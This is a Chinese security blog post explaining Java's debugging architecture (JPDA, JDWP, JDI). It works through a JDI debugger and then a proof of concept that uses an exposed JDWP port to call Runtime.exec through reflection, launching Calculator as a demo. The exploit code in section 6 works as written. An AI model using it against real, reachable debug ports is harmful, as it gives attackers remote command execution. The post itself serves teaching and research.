@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                从编写JDI调试到实现JDWP命令执行 |
+                    
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">从编写JDI调试到实现JDWP命令执行</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/logo.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">langu_xyz</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-09-06 21:00:00
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2.5k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>10 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="1-JPDA"><a href="#1-JPDA" class="headerlink" title="1.JPDA"></a>1.JPDA</h2><p>JPDA(Java Platform Debugger Architecture) 是 Java 平台调试体系结构的缩写，通过 JPDA 提供的 API，开发人员可以方便灵活的搭建 Java 调试应用程序。<br>JPDA 主要由三个部分组成：</p>
+<pre><code>Java 虚拟机工具接口（JVMTI）
+Java 调试线协议（JDWP）
+Java 调试接口（JDI）
+</code></pre>
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+<h2 id="2-JVM-TI"><a href="#2-JVM-TI" class="headerlink" title="2.JVM TI"></a>2.JVM TI</h2><p>JVMTI其实就是一套由虚拟机直接提供的本地代码接口，包含了调试、监听、线程分析及覆盖率分析等接口，它处于整个JPDA体系的最底层。</p>
+<p>一般可以通过采用建立一个Agent的方式来使用JVMTI，其显著的特征就是通过设置回调函数的方式，从java虚拟机上得到当前运行态信息，并做出自己的相应的操作，抑或操作虚拟机的运行态，以达到一些特定的目的（如优化程序性能）。</p>
+<p>把Agent编译成一个动态链接库后，就可以在java程序启动/运行的时候（增加启动参数agentlib/ agentpath）来加载它。</p>
+<p>以启动时加载为例:</p>
+<p><img lazyload src="/images/loading.svg" data-src="2.png"></p>
+<h2 id="3-JDWP"><a href="#3-JDWP" class="headerlink" title="3.JDWP"></a>3.JDWP</h2><p>JDWP 是 Java Debug Wire Protocol 的缩写，它定义了调试器（debugger）和被调试的 Java 虚拟机（target vm）之间的通信协议。</p>
+<p>Target vm 中运行着我们希望要调试的程序，它与一般运行的 Java 虚拟机没有什么区别，只是在启动时加载了 Agent JDWP 从而具备了调试功能。</p>
+<p>debugger 向运行中的 target vm 发送命令来获取 target vm 运行时的状态和控制 Java 程序的执行。</p>
+<h3 id="3-1JDWP-Start-Up"><a href="#3-1JDWP-Start-Up" class="headerlink" title="3.1JDWP Start Up"></a>3.1JDWP Start Up</h3><p>在建立传输链接之后，连接的两端首先会进行握手，然后再进行其它数据包的传输。<br>握手的步骤有以下两步：<br>    1. debugger侧发送14 bytes 的 14个ASCII字符 “JDWP-Handshake”到VM中；<br>    2. VM回复相同的14 bytes “JDWP-Handshake” 完成握手。</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://docs.oracle.com/en/java/javase/12/docs/specs/jdwp/jdwp-spec.html">https://docs.oracle.com/en/java/javase/12/docs/specs/jdwp/jdwp-spec.html<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="3-2Packet结构"><a href="#3-2Packet结构" class="headerlink" title="3.2Packet结构"></a>3.2Packet结构</h3><p>命令包（command packet）和回复包（reply packet），Packet分为包头（header）和数据（data）两部分组成。包头部分的结构和长度是固定的，而数据部分的长度是可变的。command packet和reply packet的包头长度相同，都是11个bytes。</p>
+<p><img lazyload src="/images/loading.svg" data-src="3.png"></p>
+<p>Length 和 Id 字段是不言自明的。Flag 字段仅用于区分请求包和回复包，值为 0x80 表示回复包。CommandSet 字段定义了命令的类别，如下表所示。 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">命令集	      命令</span><br><span class="line">0x40	       JVM 采取的行动（例如设置断点）</span><br><span class="line">0x40–0x7F	   向调试器提供事件信息（例如，JVM 已达到断点并等待进一步的操作）</span><br><span class="line">0x80	       第三方扩展</span><br></pre></td></tr></table></figure>
+
+<p>请记住，我们要执行任意代码，以下命令对我们来说是最有趣的。<br>    •    VirtualMachine/IDSizes 定义了 JVM 处理的数据结构的大小。这是 nmap 脚本 jdwp-exec.nse[11] 不起作用的原因之一，因为该脚本使用硬编码的大小。<br>    •    ClassType/InvokeMethod 允许您调用静态函数。<br>    •    ObjectReference/InvokeMethod 允许您从 JVM 中的实例化对象调用函数。<br>    •    StackFrame/(Get|Set)Values 提供从线程堆栈推送/弹出功能。<br>    •    Event/Composite 强制 JVM 对该命令声明的特定行为做出反应。此命令是调试目的的主要关键，因为它允许设置断点，在运行时单步执行线程，并在以与 GDB 或 WinDBG 完全相同的方式访问/修改值时收到通知。<br> <br>JDWP 不仅允许您访问和调用已驻留在内存中的对象，还允许您创建或覆盖数据。<br>    •    VirtualMachine/CreateString 允许您将字符串转换为存在于 JVM 运行时中的 java.lang.String。<br>    •    VirtualMachine/RedefineClasses 允许您安装新的类定义。</p>
+<p>上述的定义是重要的，JDI可以利用invokeMethod调用目标 VM 中此对象的指定方法，这是实现命令执行的关键</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ObjectReference getObjectReference = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).classObject();</span><br><span class="line">Method getMethod = vm.classesByName(&quot;java.lang.Class&quot;).get(0).methodsByName(&quot;getMethod&quot;).get(0);</span><br><span class="line">…….</span><br><span class="line"></span><br><span class="line">ObjectReference getRuntimeMethodRe = (ObjectReference) getObjectReference.invokeMethod(threadReference, getMethod, param1, 1);</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="3-3Using-JDWP"><a href="#3-3Using-JDWP" class="headerlink" title="3.3Using JDWP"></a>3.3Using JDWP</h3><p>java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=8000</p>
+<pre><code>-agentlib:jdwp ：JVM加载jdwp代理
+transport=dt_socket ： 使用socket传输
+server=y ： JVM将listen for a debugger注入到其中
+suspend=y  ： JVM在执行主类之前等待debugger attach，如果设置为n，则直接执行主类，同时进行监听
+address=8000 ： 指定套接字的端口，在JDK9及以后，这种配置只监听localhost的8000端口
+</code></pre>
+<h2 id="4-Debug过程"><a href="#4-Debug过程" class="headerlink" title="4.Debug过程"></a>4.Debug过程</h2><p>1、先建立起了 socket 连接</p>
+<p>2、将断点位置创建了断点事件通过 JDI 接口传给了 服务端（程序端）的 VM，VM 调用 suspend 将 VM 挂起</p>
+<p>3、VM 挂起之后将客户端需要获取的 VM 信息返回给客户端，返回之后 VM resume 恢复其运行状态</p>
+<p>4、客户端获取到 VM 返回的信息之后可以通过不同的方式展示给客户</p>
+<h3 id="4-1基于JDI编写一个调试代码"><a href="#4-1基于JDI编写一个调试代码" class="headerlink" title="4.1基于JDI编写一个调试代码"></a>4.1基于JDI编写一个调试代码</h3><p>1.创建Connector</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">VirtualMachineManager vmm = Bootstrap.virtualMachineManager();</span><br><span class="line">List&lt;AttachingConnector&gt; connectors = vmm.attachingConnectors();</span><br><span class="line">SocketAttachingConnector sac = null;</span><br><span class="line">for (AttachingConnector ac : connectors) &#123;</span><br><span class="line">    if (ac instanceof SocketAttachingConnector) &#123;</span><br><span class="line">        sac = (SocketAttachingConnector) ac;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (sac == null) &#123;</span><br><span class="line">    System.out.println(&quot;JDI error&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>2.链接到JVM</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Connector.Argument&gt; arguments = sac.defaultArguments();</span><br><span class="line">Connector.Argument hostArg = (Connector.Argument) arguments.get(HOST);</span><br><span class="line">Connector.Argument portArg = (Connector.Argument) arguments.get(PORT);</span><br><span class="line"></span><br><span class="line">hostArg.setValue(&quot;127.0.0.1&quot;);</span><br><span class="line">portArg.setValue(String.valueOf(8800));</span><br><span class="line"></span><br><span class="line">vm = sac.attach(arguments);</span><br><span class="line">process = vm.process();</span><br><span class="line">eventRequestManager = vm.eventRequestManager();</span><br></pre></td></tr></table></figure>
+
+<p>3.获取要调试的类和方法名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">List&lt;ReferenceType&gt; classesByName = vm.classesByName(&quot;test.Test&quot;);</span><br><span class="line">if (classesByName == null || classesByName.size() == 0) &#123;</span><br><span class="line">    System.out.println(&quot;No class found&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">ReferenceType rt = classesByName.get(0);</span><br><span class="line">List&lt;Method&gt; methodsByName = rt.methodsByName(&quot;printHello&quot;);</span><br><span class="line">if (methodsByName == null || methodsByName.size() == 0) &#123;</span><br><span class="line">    System.out.println(&quot;No method found&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line">Method method = methodsByName.get(0);</span><br></pre></td></tr></table></figure>
+
+<p>4.设置要调试的断点</p>
+<p>获取断点进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BreakpointEvent breakpointEvent = (BreakpointEvent) event;</span><br><span class="line">ThreadReference threadReference = breakpointEvent.thread();</span><br><span class="line">StackFrame stackFrame = threadReference.frame(0);</span><br><span class="line"></span><br><span class="line">stackFrame.visibleVariables();</span><br></pre></td></tr></table></figure>
+
+<p>设置断点位置和断点事件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// Get location</span><br><span class="line">ReferenceType referenceType = classPrepareEvent.referenceType();</span><br><span class="line">List locations = referenceType.locationsOfLine(34);</span><br><span class="line">Location location = (Location) locations.get(0);</span><br><span class="line"></span><br><span class="line">// Create BreakpointEvent</span><br><span class="line">BreakpointRequest breakpointRequest = eventRequestManager.createBreakpointRequest(location);</span><br><span class="line">breakpointRequest.setSuspendPolicy(EventRequest.SUSPEND_ALL);</span><br><span class="line">breakpointRequest.enable();</span><br></pre></td></tr></table></figure>
+
+
+<p>5.监听断点并执行调试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vm.setDebugTraceMode(VirtualMachine.TRACE_EVENTS);</span><br><span class="line">vm.resume();</span><br><span class="line"></span><br><span class="line">List&lt;Location&gt; locations = classesByName.get(0).locationsOfLine(34);</span><br><span class="line">BreakpointRequest breakpointRequest = eventRequestManager.createBreakpointRequest(locations.get(0));</span><br><span class="line">breakpointRequest.enable();</span><br><span class="line"></span><br><span class="line">eventLoop();  //要调试的断点和执行</span><br></pre></td></tr></table></figure>
+
+<p><img lazyload src="/images/loading.svg" data-src="4.png"></p>
+<h2 id="5-JDWP-命令执行原理"><a href="#5-JDWP-命令执行原理" class="headerlink" title="5.JDWP 命令执行原理"></a>5.JDWP 命令执行原理</h2><p>原理部分参考：<a class="link" target="_blank" rel="noopener" href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/">https://ioactive.com/hacking-java-debug-wire-protocol-or-how/<i class="fas fa-external-link-alt"></i></a></p>
+<ol>
+<li>获取 Java 运行时参考<br>JVM 通过对象的引用来操作对象。因此，我们的漏洞利用必须首先获取对 java.lang.Runtime 类的引用。从这个类中，我们需要对 getRuntime() 方法的引用。这是通过获取所有类（AllClasses 数据包）和我们正在寻找的类中的所有方法（ReferenceType/Methods 数据包）来执行的。
+ </li>
+<li>设置断点并等待通知（异步调用）<br>这是我们利用的关键。要调用任意代码，我们需要处于正在运行的线程上下文中。为此，hack 是在已知在运行时调用的方法上设置断点。如前所述，JDI 中的断点是一个异步事件，其类型设置为 BREAKPOINT(0x02)。当命中时，JVM 向我们的调试器发送一个 EventData 数据包，其中包含我们的断点 ID，更重要的是，对命中它的线程的引用。</li>
+</ol>
+<p><img lazyload src="/images/loading.svg" data-src="5.png"></p>
+<p>因此，将其设置在经常调用的方法上是一个好主意，例如 java.net.ServerSocket.accept()，每次服务器接收到新的网络连接时很可能会调用该方法。但是，必须记住，它可以是运行时存在的任何方法。<br> <br>3.在Runtime中分配一个Java String对象来执行payload<br>我们将在 JVM 运行时中执行代码，因此我们所有的操作数据（如字符串）必须存在于 JVM 运行时中（即拥有运行时引用）。这很容易通过发送 CreateString 命令来完成。</p>
+<p><img lazyload src="/images/loading.svg" data-src="6.png"></p>
+<ol start="4">
+<li>从断点上下文中获取运行时对象<br>在这一点上，我们几乎拥有成功、可靠利用所需的所有元素。我们缺少的是运行时对象引用。获取很简单，我们可以简单的在JVM运行时执行java.lang.Runtime.getRuntime()静态方法[8]，通过发送ClassType/InvokeMethod包并提供Runtime类和线程引用。
+ </li>
+<li>在Runtime实例中查找并调用exec()方法<br>最后一步是简单地在上一步获得的运行时静态对象中查找 exec() 方法，并使用我们在第三步中创建的 String 对象调用它（通过发送 ObjectReference/InvokeMethod 数据包）。</li>
+</ol>
+<p><img lazyload src="/images/loading.svg" data-src="7.png"> </p>
+<h2 id="6-基于JDI实现命令调用"><a href="#6-基于JDI实现命令调用" class="headerlink" title="6.基于JDI实现命令调用"></a>6.基于JDI实现命令调用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">private static void exec(ThreadReference threadReference) throws Exception &#123;</span><br><span class="line">        //目标虚拟机中对象的类型。 ReferenceType包含The Java™ Language Specification中定义的类，接口和数组类型。 所有ReferenceType对象都属于以下子接口之一： ClassType用于类， InterfaceType用于接口， ArrayType用于阵列。 请注意，原始类（例如Integer.TYPE的reflected type ）被表示为ClassType。</span><br><span class="line">        // VM为所有三个创建Class对象，因此从VM的角度来看，每个ReferenceType映射到一个不同的Class对象。</span><br><span class="line"></span><br><span class="line">        /*//获取对象</span><br><span class="line">            Class cls = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">            //实例化对象</span><br><span class="line">            Object ob = cls.getMethod(&quot;getRuntime&quot;,null).invoke(null,null);</span><br><span class="line">            // 反射调用执行命令</span><br><span class="line">            cls.getMethod(&quot;exec&quot;, String.class).invoke(ob,&quot;calc&quot;);</span><br><span class="line">*/</span><br><span class="line">        ObjectReference getObjectReference = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).classObject();</span><br><span class="line">        Method getMethod = vm.classesByName(&quot;java.lang.Class&quot;).get(0).methodsByName(&quot;getMethod&quot;).get(0);</span><br><span class="line">        //Java.lang.Class.getMethod()</span><br><span class="line">        //返回一个 Method 对象</span><br><span class="line">        Method getMethodInvoke = vm.classesByName(&quot;java.lang.reflect.Method&quot;).get(0).methodsByName(&quot;invoke&quot;).get(0);</span><br><span class="line">        //java.lang.reflect.Method.invoke</span><br><span class="line">        Method getExecMethod = vm.classesByName(&quot;java.lang.Runtime&quot;).get(0).methodsByName(&quot;exec&quot;).get(0);</span><br><span class="line">        //java.lang.Runtime.exec</span><br><span class="line">        List&lt;Value&gt; param1 = new ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        param1.add(vm.mirrorOf(&quot;getRuntime&quot;));</span><br><span class="line">        //在此虚拟机中创建一个字符串。</span><br><span class="line">        ObjectReference getRuntimeMethodRe = (ObjectReference) getObjectReference.invokeMethod(threadReference, getMethod, param1, 1);</span><br><span class="line">        //invokeMethod(ThreadReference thread, Method method, List&lt;? extends Value&gt; arguments, int options)</span><br><span class="line">        //调用目标 VM 中此对象的指定方法。  java.lang.Runtime.getRuntime()</span><br><span class="line"></span><br><span class="line">        List&lt;Value&gt; param2 = new ArrayList&lt;&gt;();</span><br><span class="line">        param2.add(null);</span><br><span class="line">        ObjectReference runtimeIns = (ObjectReference) getRuntimeMethodRe.invokeMethod(threadReference, getMethodInvoke, param2, 1);</span><br><span class="line">        //java.lang.Runtime.getRuntime().invoke()</span><br><span class="line"></span><br><span class="line">        List&lt;Value&gt; param3 = new ArrayList&lt;&gt;();</span><br><span class="line">        param3.add(vm.mirrorOf(&quot;open /System/Applications/Calculator.app&quot;));</span><br><span class="line"></span><br><span class="line">        runtimeIns.invokeMethod(threadReference, getExecMethod, param3, 1);</span><br><span class="line">        //java.lang.Runtime.getRuntime().exec(&quot;cmd&quot;).invoke()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>监听可能会执行到的线程，等待触发，可以选择大概率会被触发的类的线程来监听，例如“java.net.ServerSocket.accep”、“java.lang.String”等</p>
+<p><img lazyload src="/images/loading.svg" data-src="8.png"><br><img lazyload src="/images/loading.svg" data-src="9.png"><br><img lazyload src="/images/loading.svg" data-src="10.png"></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：从编写JDI调试到实现JDWP命令执行</li>
+        <li>Post author：langu_xyz</li>
+        <li>Create time：2021-09-06 21:00:00</li>
+        <li>
+            Post link：https://blog.langu.xyz/从编写JDI调试到实现JDWP命令执行/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/%E8%BE%BE%E5%85%8B%E6%95%88%E5%BA%94%E3%80%81%E5%82%BB%E9%80%BC%E9%80%9F%E7%8E%87%E4%B8%8E%E8%87%AA%E6%88%91%E6%80%80%E7%96%91%E7%9A%84%E8%BF%99%E5%8D%8A%E5%B9%B4/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">达克效应、傻逼速率与自我怀疑的这半年</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/Azure%20Sentinel%20webinar:%20Enabling%20User%20and%20Entity%20Behavior%20Analytics%20(UEBA)/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Azure Sentinel webinar：Enabling User and Entity Behavior Analytics (UEBA)</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-JPDA"><span class="nav-text">1.JPDA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-JVM-TI"><span class="nav-text">2.JVM TI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-JDWP"><span class="nav-text">3.JDWP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1JDWP-Start-Up"><span class="nav-text">3.1JDWP Start Up</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2Packet%E7%BB%93%E6%9E%84"><span class="nav-text">3.2Packet结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3Using-JDWP"><span class="nav-text">3.3Using JDWP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Debug%E8%BF%87%E7%A8%8B"><span class="nav-text">4.Debug过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1%E5%9F%BA%E4%BA%8EJDI%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E8%B0%83%E8%AF%95%E4%BB%A3%E7%A0%81"><span class="nav-text">4.1基于JDI编写一个调试代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-JDWP-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="nav-text">5.JDWP 命令执行原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 